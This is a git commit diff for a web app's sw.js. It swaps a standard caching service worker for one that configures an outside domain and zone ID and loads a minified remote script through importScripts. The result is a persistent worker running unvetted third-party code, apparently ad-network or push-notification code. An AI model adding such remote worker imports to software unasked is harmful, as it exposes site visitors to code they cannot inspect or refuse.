f8fe0993a8c3c0385e336a93026fd16e4861d988
Ganz494 <stmganzz2@gmail.com>
2026-08-16 19:17:57 +0700

    Add files via upload

--- sw.js
+++ sw.js
@@ -1,25 +1,6 @@
-const CACHE_NAME = 'watchme-cache-v1';
-const urlsToCache = [
-  './index.html',
-  './kategori.html',
-  './jadwal.html',
-  './favorit.html',
-  './nonton.html',
-  './css/style.css',
-  './js/main.js',
-  './logo.svg'
-];
-
-self.addEventListener('install', event => {
-  event.waitUntil(
-    caches.open(CACHE_NAME)
-      .then(cache => cache.addAll(urlsToCache))
-  );
-});
-
-self.addEventListener('fetch', event => {
-  event.respondWith(
-    caches.match(event.request)
-      .then(response => response || fetch(event.request))
-  );
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 11588775
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
